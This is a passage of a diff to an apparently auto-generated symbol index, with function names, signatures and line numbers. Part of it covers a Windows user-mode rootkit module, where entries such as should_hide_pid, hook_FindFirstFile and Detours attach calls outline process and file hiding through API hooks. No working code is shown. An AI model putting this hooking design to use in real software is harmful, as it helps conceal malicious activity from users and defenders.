-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:712`
-
-### time (function) `time(&start_date);`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:912`
-
-### WSACleanup (function) `WSACleanup();`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.c:957`
-
 ## modules/win_rootkit/win_ring3_rootkit.cpp
 
 ### get_username_from_pid (function) `char* get_username_from_pid(DWORD pid)`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.cpp:41`
+- Defined: `modules/win_rootkit/win_ring3_rootkit.cpp:42`
 
 ### should_hide_pid (function) `int should_hide_pid(const char* pid)`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.cpp:64`
+- Defined: `modules/win_rootkit/win_ring3_rootkit.cpp:65`
 
 ### hook_FindFirstFile (function) `HANDLE WINAPI hook_FindFirstFile(CONST char* path, WIN32_FIND_DATA* find_data)`
 - Defined: `modules/win_rootkit/win_ring3_rootkit.cpp:75`
@@ -35204,34 +34389,7 @@ str_cut(char str[], int slice_from, int slice_to)`
 - Defined: `modules/win_rootkit/win_ring3_rootkit.cpp:85`
 
 ### DllMain (function) `BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.cpp:93`
-
-### CloseHandle (function) `CloseHandle(hProcessSnap);`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.cpp:50`
-
-### SetLastError (function) `SetLastError(ERROR_FILE_NOT_FOUND);`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.cpp:77`
-
-### original_FindFirstFile (function) `return original_FindFirstFile(path, find_data);`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.cpp:80`
-
-### original_CreateFile (function) `return original_CreateFile(path, access, share, security, creation, flags, template);`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.cpp:90`
-
-### DetourTransactionBegin (function) `case DLL_PROCESS_ATTACH: DetourTransactionBegin();`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.cpp:96`
-
-### DetourUpdateThread (function) `DetourUpdateThread(GetCurrentThread());`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.cpp:98`
-
-### DetourAttach (function) `DetourAttach(&(PVOID&)original_FindFirstFile, hook_FindFirstFile);`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.cpp:99`
-
-### DetourTransactionCommit (function) `DetourTransactionCommit();`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.cpp:101`
-
-### DetourDetach (function) `DetourDetach(&(PVOID&)original_FindFirstFile, hook_FindFirstFile);`
-- Defined: `modules/win_rootkit/win_ring3_rootkit.cpp:106`
+- Defined: `modules/win_rootkit/win_ring3_rootkit.cpp:94`
 
 ## modules/world_model.py
 
